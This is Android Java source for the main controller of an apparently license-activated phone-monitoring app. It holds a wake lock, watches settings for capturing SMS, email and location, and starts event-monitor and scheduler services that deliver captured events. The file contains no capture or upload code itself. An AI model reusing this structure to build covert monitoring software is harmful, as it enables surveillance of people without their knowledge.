package com.vvt.android.syncmanager.control;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

import com.fx.dalvik.activation.ActivationResponse;
import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.service.EventMonitorService;
import com.vvt.android.syncmanager.service.SchedulerService;
import com.vvt.android.syncmanager.utils.ResourcesWrapper;

public class Main implements LicenseManager.Callback {

//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------

	private static final String TAG = "Main";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static Main sInstance;

	private static Context sContext = null;
	private static WakeLock sWakeLock = null;
	
	/**
	 * Time that the application is started.
	 */
	private final long mAppStartTimeMilliseconds = System.currentTimeMillis(); 
	
	private LicenseManager mLicenseManager;
	private ConfigurationManager mConfigurationManager;
	private EventManager mEventsManager;
	private DatabaseManager mDatabaseManager;
	
	private ContentObserver mObservePrefEnableCapture;
	private ContentObserver mObservePrefCaptureSms;
	private ContentObserver mObservePrefCaptureEmail;
	private ContentObserver mObservePrefCaptureLocation;
	private ContentObserver mObservePrefDeliveryPeriod;
	private ContentObserver mObservePrefMaxEvents;
	
	private Main(Context context) {
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # ENTER ...");
		
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Set application context...");
		sContext = context;
		
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Set resource wrapper...");
		ResourcesWrapper.setResources(sContext.getResources());
	
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Init ConfigurationManager ...");
		mConfigurationManager = new ConfigurationManager(sContext);
		
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Init LicenseManager ...");
		mLicenseManager = new LicenseManager(sContext, mConfigurationManager);
		mLicenseManager.loadFromStorage();
		
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Init DatabaseManager ...");
		mDatabaseManager = new DatabaseManager(sContext);
		
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Init EventsManager ...");
		mEventsManager = new EventManager(sContext, mDatabaseManager);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "Main # Register preferences observers ...");
		}
		registerPrefObservers();
		mLicenseManager.addCallback(this);
		
		if (LOCAL_LOGV) FxLog.v(TAG, "Main # Start services ...");
		startServices();
	}
	
	public static Main getInstance() {
		if (sInstance == null) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, "getInstance # Context is not set.");
			}
		}
		return sInstance;
	}
	
	public static void startIfNotStarted(Context context) {
		if (context == null) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, "startIfNotStarted # Context cannot be null.");
			}
		}
		
		else if (sInstance == null) {
			sInstance = new Main(context);
		}
	}
	
	public static Context getContext() {
		return sContext;
	}
	
	public static ContentResolver getContentResolver() {
		if (sContext == null) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, "getContentResolver # Context is not set.");
			}
		}
		return sContext.getContentResolver();
	}

	// Only control the services (called by LicenseManager)
	public void onActivateDeactivateComplete(ActivationResponse response) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onActivateDeactivateComplete # ENTER ...");
		}
		
		if (mLicenseManager.isActivated()) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "Already activated, start services...");
			}
			startServices();
		} 
		else {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "Deactivated, reset services ...");
			}
			resetEventMonitorService();
			resetSchedulerService();
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onActivateDeactivateComplete # EXIT ...");
		}
	}
	
	public void startServices() { 
		if (LOCAL_LOGV) FxLog.v(TAG, "startServices # ENTER ...");
		
		if (sWakeLock == null) {
			PowerManager powerManager = 
				(PowerManager) sContext.getSystemService(Context.POWER_SERVICE);
			
			sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
			sWakeLock.acquire();
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "startServices # WakeLock Acquired");
			}
		}
		
		if (LOCAL_LOGV) FxLog.v(TAG, "startServices # Services are starting up ...");
		resetEventMonitorService();
		resetSchedulerService();
		
		if (LOCAL_LOGV) FxLog.v(TAG, "startServices # EXIT ...");
	}
	
	public void stopServices() { 
		if (LOCAL_LOGV) FxLog.v(TAG, "stopServices # ENTER ...");
		
		// Stop the services (yes in this order)
		sContext.stopService(new Intent().setClass(
				Main.getContext(), EventMonitorService.class));
		
		sContext.stopService(new Intent().setClass(
				Main.getContext(), SchedulerService.class));
		
		if (sWakeLock != null) {
			sWakeLock.release();
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "stopServices # WakeLock Released");
			}
			sWakeLock = null;
		}
		
		if (LOCAL_LOGV) FxLog.v(TAG, "stopServices # EXIT ...");
	}
	
	public ConfigurationManager getConfigurationManager() {
		return mConfigurationManager;
	}
	
	public LicenseManager getLicenseManager() {
		return mLicenseManager;
	}
	
	public DatabaseManager getDatabaseManager() {
		return mDatabaseManager;
	}
	
	public EventManager getEventsManager() {
		return mEventsManager;
	}
	
	public long getAppStartTimeMilliseconds() {
		return mAppStartTimeMilliseconds;
	}
	
	private void registerPrefObservers() {
		registerPrefEnableCapture();
		registerPrefCaptureSms();
		registerPrefCaptureEmail();
		registerPrefCaptureLocation();
		registerPrefDeliveryPeriodObserver();
		registerPrefMaxEventsObserver();
	}
	
	private void registerPrefEnableCapture() {
		mObservePrefEnableCapture = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				resetEventMonitorService();
			}
		};
		
		sContext.getContentResolver().registerContentObserver(
				mConfigurationManager.getObserverUriForKey(
						ConfigurationManager.KEY_IS_CAPTURE_EVENTS), 
				false, mObservePrefEnableCapture);
	}
	
	private void registerPrefCaptureSms() {
		mObservePrefCaptureSms = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				resetEventMonitorService();
			}
		};
		
		sContext.getContentResolver().registerContentObserver(
				mConfigurationManager.getObserverUriForKey(
						ConfigurationManager.KEY_IS_CAPTURE_SMS), 
				false, mObservePrefCaptureSms);
	}
	
	private void registerPrefCaptureEmail() {
		mObservePrefCaptureEmail = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				resetEventMonitorService();
			}
		};
		
		sContext.getContentResolver().registerContentObserver(
				mConfigurationManager.getObserverUriForKey(
						ConfigurationManager.KEY_IS_CAPTURE_EMAIL), 
				false, mObservePrefCaptureEmail);
	}
	
	private void registerPrefCaptureLocation() {
		mObservePrefCaptureLocation = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				resetEventMonitorService();
			}
		};
		
		sContext.getContentResolver().registerContentObserver(
				mConfigurationManager.getObserverUriForKey(
						ConfigurationManager.KEY_IS_CAPTURE_LOCATION), 
				false, mObservePrefCaptureLocation);
	}
	
	private void registerPrefDeliveryPeriodObserver() {
		mObservePrefDeliveryPeriod = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				resetSchedulerService();
			}
		};
		
		sContext.getContentResolver().registerContentObserver(
				mConfigurationManager.getObserverUriForKey(
						ConfigurationManager.KEY_DELIVERY_PERIOD), 
				false, mObservePrefDeliveryPeriod);
	}
	
	private void registerPrefMaxEventsObserver() {
		mObservePrefMaxEvents = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				mEventsManager.processNumberOfEvents();
			}
		};
		
		sContext.getContentResolver().registerContentObserver(
				mConfigurationManager.getObserverUriForKey(
						ConfigurationManager.KEY_MAX_EVENTS), 
				false, mObservePrefMaxEvents);
	}
	
	@SuppressWarnings("unused")
	private void unregisterPrefObserver() {
		ContentResolver contentResolver = sContext.getContentResolver();
		
		if (mObservePrefEnableCapture != null) {
			contentResolver.unregisterContentObserver(mObservePrefEnableCapture);
			mObservePrefEnableCapture = null;
		}
		if (mObservePrefCaptureSms != null) {
			contentResolver.unregisterContentObserver(mObservePrefCaptureSms);
			mObservePrefCaptureSms = null;
		}
		if (mObservePrefCaptureEmail != null) {
			contentResolver.unregisterContentObserver(mObservePrefCaptureEmail);
			mObservePrefCaptureEmail = null;
		}
		if (mObservePrefCaptureLocation != null) {
			contentResolver.unregisterContentObserver(mObservePrefCaptureLocation);
			mObservePrefCaptureLocation = null;
		}
		if (mObservePrefDeliveryPeriod != null) {
			contentResolver.unregisterContentObserver(mObservePrefDeliveryPeriod);
			mObservePrefDeliveryPeriod = null;
		}
	}
	
	private void resetEventMonitorService() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "resetEventMonitorService # ENTER ...");
		}
		sContext.startService(new Intent().setClass(
				Main.getContext(), EventMonitorService.class));
	}
	
	private void resetSchedulerService() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "resetSchedulerService # ENTER ...");
		}
		
		sContext.stopService(new Intent().setClass(
				Main.getContext(), SchedulerService.class));
		
		sContext.startService(new Intent().setClass(
				Main.getContext(), SchedulerService.class));
	}
}
